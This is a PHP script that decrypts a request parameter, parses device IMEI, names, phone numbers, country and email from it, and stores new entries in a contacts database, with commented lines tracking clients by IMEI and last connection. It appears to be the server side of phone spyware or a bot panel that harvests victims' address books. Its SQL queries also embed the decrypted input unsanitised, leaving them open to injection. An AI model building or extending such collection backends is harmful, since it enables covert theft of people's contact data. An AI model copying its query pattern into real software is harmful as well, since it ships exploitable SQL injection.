<?php  
include 'crypt.php';
include 'db.php';


$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request = decrypt($request,cryptKey);

$massivReq = explode("|", $request);
$contact_raw = $massivReq[0]; 
#debug
#$contact_raw = "000000000000000:Pety:68888888888:us:Dima:dima@yandex.ru: :";

$text_log = $massivReq[1]; 
$contact = explode(":", $contact_raw);

#var_dump($contact);

if(($contact_raw != "")){
	#$path_log = "contact/$contact_raw.log";	
	#file_put_contents($path_log, "$contact_raw\n", FILE_APPEND);

	$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
	$data_ = date('Y-m-d H:i');
	//$update_sql = "UPDATE kliets SET lastConnect = '$data_', log = '1' WHERE IMEI = '$contact[0]';";
	//$mysqli->query($update_sql);

	# search contact in db via phone number	
	$search_sql = "SELECT * FROM `contacts` WHERE `phone` LIKE '$contact[2]'";
	$query_request = $mysqli->query($search_sql);
	$row = mysqli_fetch_row($query_request);
	//var_dump($query_request);
	//var_dump($row);

	if ($query_request->num_rows == 0){
		$sql = "INSERT INTO `contacts` (`IMEI`, `name`, `phone`, `country`, `e_name`, `email`) VALUES ('$contact[0]', '$contact[1]', '$contact[2]', '$contact[3]', '$contact[4]', '$contact[5]')";
		//var_dump($sql);
		$mysqli->query($sql);
	}
}
?>
